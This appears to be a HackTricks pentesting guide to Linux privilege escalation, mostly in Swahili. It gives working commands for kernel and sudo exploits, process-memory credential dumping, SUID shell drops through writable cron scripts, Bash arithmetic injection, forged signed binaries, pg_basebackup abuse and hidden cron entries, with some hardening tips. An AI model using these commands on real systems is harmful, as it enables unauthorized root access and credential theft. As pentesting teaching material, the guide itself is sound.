# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Mfumo

### Taarifa za OS

Hebu tuanze kupata maarifa kuhusu OS inayokimbia
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ikiwa una **write permissions kwenye folda yoyote ndani ya `PATH`** unaweza hijack baadhi ya libraries au binaries:
```bash
echo $PATH
```
### Taarifa za Env

Je, kuna taarifa za kuvutia, nywila au API keys katika environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Angalia toleo la kernel na kama kuna exploit yoyote inayoweza kutumika ku-escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya vulnerable kernel na baadhi ya **compiled exploits** hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambapo unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa zote vulnerable kernel versions kutoka kwenye tovuti hiyo, unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Vifaa vinavyoweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (endesha kwenye victim, huangalia tu exploits za kernel 2.x)

Kila wakati **tafuta toleo la kernel kwenye Google**, labda toleo lako la kernel limeandikwa katika kernel exploit fulani na hivyo utakuwa na uhakika exploit hiyo ni halali.

Mbinu nyingine za kernel exploitation:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo toleo

Kulingana na toleo za sudo zilizo dhaifu ambazo zinaonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia ikiwa toleo la sudo lina udhaifu kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Matoleo ya Sudo kabla ya 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) yanamruhusu watumiaji wa ndani wasiokuwa na ruhusa kuongeza hadhi yao hadi root kupitia chaguo la sudo `--chroot` wakati faili `/etc/nsswitch.conf` inatumiwa kutoka kwenye saraka inayodhibitiwa na mtumiaji.

Hapa kuna [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Kabla ya kuendesha exploit, hakikisha toleo lako la `sudo` lina udhaifu na linaunga mkono kipengele cha `chroot`.

Kwa maelezo zaidi, rejea [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) ya awali

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo kabla ya 1.9.17p1 (fikia iliyoripotiwa: **1.8.8–1.9.17**) inaweza kutathmini sheria za sudoers zinazotegemea host kwa kutumia **user-supplied hostname** kutoka `sudo -h <host>` badala ya **real hostname**. Ikiwa sudoers inatoa ruhusa pana zaidi kwa host nyingine, unaweza **spoof** host hiyo kwa mashine ya ndani.

Mahitaji:
- Toleo la sudo lenye udhaifu
- Sheria maalum za sudoers kwa host (host si hostname ya sasa wala `ALL`)

Mfano wa muundo wa sudoers:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploit kwa kutumia spoofing ya host iliyoruhusiwa:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Ikiwa utatuzi wa spoofed name umezuiwa, ongeza kwenye `/etc/hosts` au tumia hostname inayonekana tayari katika logs/configs ili kuepuka maombi ya DNS.

#### sudo < v1.8.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Uthibitishaji wa saini ya Dmesg umefeli

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii ingeweza kutumika
```bash
dmesg 2>/dev/null | grep "signature"
```
### Uorodheshaji zaidi wa mfumo
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha ulinzi unaowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Ikiwa uko ndani ya container, anza na sehemu ifuatayo ya container-security kisha pivot kwenye kurasa za runtime-specific abuse:

{{#ref}}
container-security/
{{#endref}}

## Diski

Angalia **what is mounted and unmounted**, wapi na kwa nini. Ikiwa kitu chochote kime-unmounted unaweza kujaribu ku-mount na kukagua kwa ajili ya taarifa za kibinafsi
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia ikiwa **any compiler is installed**. Hii ni muhimu ikiwa utahitaji kutumia baadhi ya kernel exploit kwani inashauriwa kui-compile kwenye mashine utakayoitumia (au kwenye moja inayofanana).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zenye Udhaifu Zilizowekwa

Kagua toleo la vifurushi na huduma zilizowekwa. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumiwa kwa ajili ya escalating privileges…\
Inashauriwa kukagua kwa mkono toleo la programu zilizosakinishwa zinazoshukiwa zaidi.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ikiwa una ufikiaji wa mashine kupitia SSH, unaweza pia kutumia **openVAS** kuangalia programu zisizosasishwa na zilizo na udhaifu zilizosakinishwa ndani ya mashine.

> [!NOTE] > _Kumbuka kwamba amri hizi zitaonyesha taarifa nyingi ambazo kwa kawaida hazitakuwa muhimu, kwa hivyo inashauriwa kutumia programu kama OpenVAS au nyingine zinazofanana ambazo zitatambua ikiwa toleo lolote la programu iliyosakinishwa lina udhaifu kwa exploits zinazojulikana_

## Processes

Angalia **ni mchakato gani** unaendeshwa na ukague ikiwa kuna mchakato wowote una **idhini zaidi kuliko inavyostahili** (labda tomcat inaendeshwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Daima angalia uwezekano wa [**electron/cef/chromium debuggers** zinaendeshwa, unaweza kuzitumia kuongezea vibali](electron-cef-chromium-debugger-abuse.md). **Linpeas** hugundua hizo kwa kuangalia parameter ya `--inspect` ndani ya mstari wa amri wa mchakato.\  
Pia **angalia vibali vyako juu ya binaries za mchakato**; labda unaweza kuandika juu ya binary ya mtu mwingine.

### Mnyororo wazazi-watoto wa watumiaji tofauti

Mchakato mtoto unaoendeshwa chini ya **mtumiaji tofauti** kuliko mzazi wake sio hatari moja kwa moja, lakini ni **ishara muhimu ya tathmini**. Mabadiliko fulani yanatarajiwa (`root` kuanzisha mtumiaji wa huduma, login managers kuunda michakato ya session), lakini mnyororo yasiyo ya kawaida yanaweza kufichua wrappers, debug helpers, persistence, au mipaka dhaifu ya uaminifu wakati wa runtime.

Quick review:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Iwapo utapata mnyororo wa kushangaza, chunguza parent command line na faili zote zinazounga mkono au kuathiri tabia yake (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). Katika baadhi ya njia halisi za privesc, child yenyewe haikuwa writable, lakini **parent-controlled config** au helper chain ilikuwa.

### Executables zilizofutwa na faili zilizo wazi baada ya kufutwa

Artifacts za runtime mara nyingi bado zinaweza kupatikana **baada ya kufutwa**. Hii ni muhimu kwa privilege escalation na pia kwa kurejesha ushahidi kutoka kwa process ambayo tayari ina faili nyeti zikiwa wazi.

Angalia executables zilizofutwa:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Ikiwa `/proc/<PID>/exe` inaonyesha `(deleted)`, mchakato bado unaendesha picha ya binary ya zamani kutoka kwa kumbukumbu. Hii ni ishara yenye nguvu ya kuchunguza kwa sababu:

- executable iliyondolewa inaweza kuwa na strings zinazovutia au credentials
- mchakato unaoendesha bado unaweza kufichua file descriptors muhimu
- privileged binary iliyofutwa inaweza kuashiria kuingiliwa kwa hivi karibuni au jaribio la kusafisha

Kusanya deleted-open files kwa mfumo mzima:
```bash
lsof +L1
```
Ikiwa utapata descriptor inayovutia, pata mara moja:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Hii ni muhimu hasa wakati mchakato bado una secret iliyofutwa, script, database export, au flag file wazi.

### Ufuatiliaji wa mchakato

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kuwa muhimu sana kubaini michakato dhaifu inayotekelezwa mara kwa mara au wakati seti ya mahitaji yanatimizwa.

### Kumbukumbu ya mchakato

Baadhi ya huduma za server huhifadhi **credentials kwa maandishi wazi ndani ya kumbukumbu**.\
Kwa kawaida utahitaji **root privileges** kusoma kumbukumbu ya michakato inayomilikiwa na watumiaji wengine, kwa hivyo hii kawaida inakuwa na manufaa zaidi ukiwa tayari root na unapotaka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma kumbukumbu ya michakato unayomiliki**.

> [!WARNING]
> Tambua kuwa sasa hivi mashine nyingi **haziruhusu ptrace kwa default** ambayo inamaanisha huwezi dump michakato mingine inayomilikiwa na mtumiaji wako asiye na ruhusa za juu.
>
> Faili _**/proc/sys/kernel/yama/ptrace_scope**_ inadhibiti upatikanaji wa ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: michakato yote inaweza kudebugged, mradi tu zina uid sawa. Hii ni njia ya kawaida jinsi ptracing ilivyofanya kazi.
> - **kernel.yama.ptrace_scope = 1**: tu mchakato mzazi unaweza kudebugged.
> - **kernel.yama.ptrace_scope = 2**: Ni admin tu anayeweza kutumia ptrace, kwani inahitaji capability ya CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Hakuna michakato inayoweza kufuatiliwa kwa ptrace. Ukipowekwa, inahitaji reboot ili kuruhusu ptracing tena.

#### GDB

Ikiwa una upatikanaji wa kumbukumbu ya huduma ya FTP (kwa mfano) unaweza kupata Heap na kutafuta ndani yake credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skripti ya GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa kitambulisho cha mchakato (PID) fulani, **maps zinaonyesha jinsi kumbukumbu inavyopangwa ndani ya mchakato huo** katika nafasi ya anwani pepe; pia zinaonyesha **ruhusa za kila eneo lililopangwa**. Faili bandia **mem** **inafunua kumbukumbu za mchakato yenyewe**. Kutoka kwa faili ya **maps** tunajua ni **mikoa ya kumbukumbu inayoweza kusomwa** na offsets zao. Tunatumia taarifa hii **kufanya seek kwenye faili mem na dump maeneo yote yanayosomwa** kwenye faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` hutoa ufikiaji wa kumbukumbu ya mfumo ya **kimwili**, si kumbukumbu ya virtual. Eneo la anwani za virtual la kernel linaweza kufikiwa kwa kutumia /dev/kmem.\
Kawaida, `/dev/mem` inasomeka tu na **root** na kundi la kmem.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump ni utekelezaji wa Linux uliotengenezwa upya wa zana ya klasiki ProcDump kutoka kwenye suite ya zana za Sysinternals kwa Windows. Pata katika [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Zana

Ili dump kumbukumbu za mchakato unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kwa mikono kuondoa mahitaji ya root na dump mchakato unaomilikiwa na wewe
- Script A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (inahitaji root)

### Uthibitisho kutoka kwenye kumbukumbu za mchakato

#### Mfano la mkono

Ikiwa utagundua kuwa mchakato wa authenticator unaendeshwa:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza dump the process (angalia sehemu zilizotangulia ili kupata njia tofauti za dump memory ya process) na search for credentials ndani ya memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Zana [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) itapora **nyaraka za kuingia zenye maandishi wazi** kutoka kwenye kumbukumbu na kutoka kwa baadhi ya **faili zinazojulikana**. Inahitaji ruhusa za root ili ifanye kazi ipasavyo.

| Sifa                                              | Jina la mchakato     |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Tafuta Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Kazi zilizopangwa/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Ikiwa paneli ya wavuti “Crontab UI” (alseambusher/crontab-ui) inaendesha kama root na imefungwa kwa loopback pekee, bado unaweza kuifikia kupitia SSH local port-forwarding na kuunda kazi yenye ruhusa za juu ili kupandisha cheo.

Typical chain
- Gundua bandari iliyofungwa kwa loopback pekee (mf., 127.0.0.1:8000) na Basic-Auth realm kupitia `ss -ntlp` / `curl -v localhost:8000`
- Tafuta credentials katika operational artifacts:
- Backups/scripts with `zip -P <password>`
- systemd unit exposing `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Unda job ya high-priv na uendeshe mara moja (inatoa SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Tumia:
```bash
/tmp/rootshell -p   # root shell
```
Kuimarisha
- Usiruhusu Crontab UI kuendesha kama root; tumia mtumiaji maalum na idhini chache
- Funga kwenye localhost na pia zuia upatikanaji kupitia firewall/VPN; usitumie nywila zilizorudiwa
- Epuka kuingiza secrets ndani ya unit files; tumia secret stores au root-only EnvironmentFile
- Washa audit/logging kwa utekelezaji wa job kwa ombi

Kagua kama kuna scheduled job yenye udhaifu. Labda unaweza kuchukua faida ya script inayotekelezwa na root (wildcard vuln? unaweza kubadilisha faili ambazo root anazitumia? tumia symlinks? unda faili maalum katika directory ambayo root anaitumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Ikiwa `run-parts` inatumika, angalia ni majina gani yataendesha kweli:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Hii inaepuka false positives. Kabrasha la periodic linaloweza kuandikwa lina manufaa tu ikiwa jina la faili ya payload yako linaendana na sheria za ndani za `run-parts`.

### Cron path

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kumbuka jinsi mtumiaji "user" ana haki za kuandika juu ya /home/user_)

Ikiwa ndani ya crontab hii mtumiaji root anajaribu kutekeleza amri au script bila kuweka PATH. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Kisha, unaweza kupata shell ya root kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron inayotumia script yenye wildcard (Wildcard Injection)

Ikiwa script inatekelezwa na root na ina “**\***” ndani ya amri, unaweza kuitumia kufanya mambo yasiyotegemewa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**If the wildcard is preceded of a path like** _**/some/path/\***_ **, haiko hatarini (hata** _**./\***_ **haiko).**

Soma ukurasa ufuatao kwa mbinu zaidi za wildcard exploitation:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash hufanya parameter expansion na command substitution kabla ya arithmetic evaluation katika ((...)), $((...)) na let. Ikiwa root cron/parser inasoma fields za log zisizo aminiwa na kuzitoa kwenye arithmetic context, attacker anaweza kuinject command substitution $(...) ambayo itaendesha kama root wakati cron inakimbia.

- Why it works: Katika Bash, expansions hutokea kwa mpangilio huu: parameter/variable expansion, command substitution, arithmetic expansion, kisha word splitting na pathname expansion. Kwa hivyo value kama `$(/bin/bash -c 'id > /tmp/pwn')0` kwanza inabadilishwa (ikiendesha command), kisha nambari iliyobaki `0` inatumika kwa arithmetic hivyo script inaendelea bila makosa.

- Mfano wa kawaida ulio hatarini:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Pata text inayodhibitiwa na attacker imeandikwa kwenye log inayochambuliwa ili field inayoonekana kama nambari iwe na command substitution na kumalizika kwa digit. Hakikisha command yako haisemi chochote kwa stdout (au ui-redirect) ili arithmetic ibaki sahihi.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Ikiwa wewe **can modify a cron script** inayotekelezwa na root, unaweza kupata shell kwa urahisi sana:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ikiwa script inayotekelezwa na root inatumia **directory ambapo una upatikanaji kamili**, inaweza kuwa muhimu kufuta folder hiyo na **kuunda folder ya symlink kwenda nyingine** inayotumikia script inayodhibitiwa na wewe
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Uthibitishaji wa symlink na utunzaji salama wa faili

Unapokagua privileged scripts/binaries ambazo husoma au kuandika faili kwa path, thibitisha jinsi links zinavyoshughulikiwa:

- `stat()` inafuata symlink na hurudisha metadata ya target.
- `lstat()` hurudisha metadata ya link yenyewe.
- `readlink -f` na `namei -l` husaidia kutatua target ya mwisho na kuonyesha ruhusa za kila sehemu ya path.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
For defenders/developers, safer patterns against symlink tricks include:

- `O_EXCL` with `O_CREAT`: fail if the path already exists (huzuia mshambuliaji kuunda awali links/files).
- `openat()`: operate relative to a trusted directory file descriptor (fanya kazi kuhusiana na trusted directory file descriptor).
- `mkstemp()`: create temporary files atomically with secure permissions (unda temporary files kwa atomiki na ruhusa salama).

### Custom-signed cron binaries with writable payloads
Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:

1. Tumia `pspy` to capture the verification flow. Katika Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary while preserving execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.

### Frequent cron jobs

Unaweza kufuatilia the processes to search for processes that are being executed every 1, 2 or 5 minutes. Labda unaweza kuchukua faida yake na escalate privileges.

For example, to **fuatilia kila 0.1s kwa dakika 1**, **panga kwa amri zilizoendeshwa mara chache** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila mchakato unaoanza).

### Backups za root zinazoifadhi mode bits zilizowekwa na mshambuliaji (pg_basebackup)

Ikiwa cron inayomilikiwa na root inazunguka `pg_basebackup` (au nakala yoyote ya recursive) dhidi ya directory ya database ambayo unaweza kuandika, unaweza kuwekea **SUID/SGID binary** ambayo itarekopiwa tena kama **root:root** na mode bits zile zile katika matokeo ya backup.

Typical discovery flow (as a low-priv DB user):
- Use `pspy` to spot a root cron calling something like `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` every minute.
- Confirm the source cluster (e.g., `/var/lib/postgresql/14/main`) is writable by you and the destination (`/opt/backups/current`) becomes owned by root after the job.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Hii inafanya kazi kwa sababu `pg_basebackup` huhifadhi bits za mode za faili wakati wa kunakili cluster; inapoitwa na root, faili za marudio zinapata **umiliki wa root + SUID/SGID iliyochaguliwa na mshambuliaji**. Taratibu yoyote sawa ya privileged backup/copy inayohifadhi permissions na kuandika katika eneo la executable ni dhaifu.

### Cron jobs zisizoonekana

Inawezekana kuunda cronjob kwa **kuweka carriage return baada ya comment** (bila tabia ya newline), na cron job itafanya kazi. Mfano (kumbuka tabia ya carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Ili kugundua aina hii ya kuingia kwa siri, kagua mafaili ya cron kwa kutumia zana zinazofichua herufi za udhibiti:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Huduma

### Mafaili ya _.service_ yanayoweza kuandikwa

Angalia ikiwa unaweza kuandika faili yoyote ya `.service`, ikiwa unaweza, unaweza **kuibadilisha** ili i**tekeleze** **backdoor yako wakati** huduma inapo**anza**, inapo**anzishwa upya** au inapo**simamishwa** (labda utahitaji kusubiri hadi mashine ianze upya).\
Kwa mfano tengeneza backdoor yako ndani ya faili ya .service kwa **`ExecStart=/tmp/script.sh`**

### Service binaries zinazoweza kuandikwa

Kumbuka kwamba ikiwa una **idhini ya kuandika juu ya binaries zinazotekelezwa na services**, unaweza kuzibadilisha kuwa backdoors ili wakati services zitakaporudi kutekelezwa backdoors zitatekelezwa.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumika na **systemd** na:
```bash
systemctl show-environment
```
Ikiwa utagundua kwamba unaweza **write** katika yoyote ya folda za njia, unaweza kuwa na uwezo wa **escalate privileges**. Unahitaji kutafuta **relative paths being used on service configurations** kwenye faili kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Then, create an **executable** with the **same name as the relative path binary** inside the systemd PATH folder you can write, and when the service is asked to execute the vulnerable action (**Start**, **Stop**, **Reload**), your **backdoor will be executed** (unprivileged users usually cannot start/stop services but check if you can use `sudo -l`).

**Jifunze zaidi kuhusu services kwa kutumia `man systemd.service`.**

## **Timers**

**Timers** ni systemd unit files ambazo jina lao linamalizika na `**.timer**` ambazo zinadhibiti faili au matukio ya `**.service**`. **Timers** zinaweza kutumika kama mbadala wa cron kwa kuwa zina msaada uliojengwa kwa calendar time events na monotonic time events na zinaweza kuendeshwa asynchronously.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
### Timers zinazoweza kuandikwa

Ikiwa unaweza kubadilisha timer, unaweza kuifanya itekeleze baadhi ya units zilizopo za systemd.unit (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
